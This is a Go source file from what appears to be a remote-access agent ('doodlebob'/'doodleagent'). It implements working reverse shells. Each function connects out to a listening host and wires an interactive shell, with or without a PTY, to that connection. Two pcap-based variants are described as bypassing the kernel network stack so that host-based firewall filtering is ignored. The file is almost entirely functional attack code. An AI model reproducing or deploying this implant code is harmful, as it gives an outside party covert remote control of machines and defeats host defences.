// Contains logic for a reverse shell
package executor

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/doodlebob/pkg/pcapconn"
	"github.com/creack/pty"
)

// OpenReverseShell opens an OS agnostic reverse shell to a listening host
func OpenReverseShell(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	cmd := exec.Command(getShell(), "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	return nil
}

// OpenReverseShellPty opens an OS agnostic reverse shell to a listening host
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func OpenReverseShellPty(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	cmd := exec.Command(getShell(), "-i")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	// Connection -> PTY (stdin)
	go func() {
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Connection (stdout + stderr)
	_, _ = io.Copy(conn, ptmx)

	return cmd.Wait()
}


// runPcapShell owns stdin copying so process exit does not wait for network EOF.
func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("opening shell stdin: %w", err)
	}
	defer stdin.Close()
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("starting shell: %w", err)
	}
	inputDone := make(chan struct{})
	go func() {
		defer close(inputDone)
		defer stdin.Close()
		_, _ = io.Copy(stdin, conn)
	}()
	shellErr := cmd.Wait()
	// Keep capture and injection running until the controller observes FIN and
	// closes its side. Bound the wait if the peer does not respond.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		select {
		case <-inputDone:
		case <-time.After(2 * time.Second):
		}
	}
	return shellErr
}

// OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
// This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
func OpenPcapReverseShell(msg *message.Message) error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	conn, err := pcapconn.Dial(
		dialCtx, device, sourcePort, targetIP, targetPort,
	)
	cancel()
	if err != nil {
		return err
	}
	defer conn.Close()

	// Dial's context only controls connection establishment.
	// Close the connection to interrupt a blocked Read on shutdown.
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	return runPcapShell(exec.Command(getShell(), "-i"), conn)
}

// runPcapShellPty owns stdin copying so process exit does not wait for network EOF.
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func runPcapShellPty(cmd *exec.Cmd, conn net.Conn) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	inputDone := make(chan struct{})
	outputDone := make(chan struct{})

	// Network -> PTY (shell input)
	go func() {
		defer close(inputDone)
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Network (shell output)
	go func() {
		defer close(outputDone)
		_, _ = io.Copy(conn, ptmx)
	}()

	// Wait for the shell to exit.
	shellErr := cmd.Wait()

	// Close the PTY to unblock any pending reads/writes.
	_ = ptmx.Close()

	// Wait for the output forwarding goroutine to finish.
	<-outputDone

	// Signal that no more shell output will be sent.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
	}

	// Wait briefly for the peer to finish sending input.
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	select {
	case <-inputDone:
	case <-time.After(2 * time.Second):
	}

	return shellErr
}

// OpenPcapReverseShellPty opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
// This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
// Spawns a pty. More risk--if pty is killed, so is doodleagent
func OpenPcapReverseShellPty(msg *message.Message) error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	conn, err := pcapconn.Dial(
		dialCtx, device, sourcePort, targetIP, targetPort,
	)
	cancel()
	if err != nil {
		return err
	}
	defer conn.Close()

	// Dial's context only controls connection establishment.
	// Close the connection to interrupt a blocked Read on shutdown.
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	return runPcapShellPty(exec.Command(getShell(), "-i"), conn)
}
